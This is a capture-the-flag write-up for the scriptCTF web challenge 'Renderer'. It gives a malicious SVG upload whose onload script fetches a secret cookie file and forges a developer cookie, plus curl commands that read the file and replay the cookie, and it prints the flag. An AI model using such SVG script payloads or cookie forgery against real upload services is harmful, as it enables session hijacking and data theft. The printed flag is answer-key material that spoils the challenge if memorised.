# Renderer (535 solves)
## Description:
>Author: NoobMaster

>Introducing Renderer! A free-to-use app to render your images!

## Attachments:
[chall.zip](https://github.com/trxvorr/Writeups/blob/main/scriptCTF/Web/Renderer/chall.zip)

## Solution:
Created a svg payload to upload (ask AI for details):
```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200"
     onload="(async()=>{try{const r=await fetch('/static/uploads/secrets/secret_cookie.txt',{cache:'no-store'});const t=(await r.text()).trim();document.cookie='developer_secret_cookie='+t+'; path=/'; top.location='/developer';}catch(e){alert(e)}})()">
  <text x="10" y="20">Renderer exploit</text>
</svg>
```
Then upload it and get the flag.

```shell
# Replace $URL with your challenge URL (e.g., http://<host>:<port>)
TOKEN=$(curl -s "$URL/static/uploads/secrets/secret_cookie.txt")
curl -s -H "Cookie: developer_secret_cookie=$TOKEN" "$URL/developer"
# scriptCTF{my_c00k135_4r3_n0t_s4f3!_9bc4aface5d4}
```
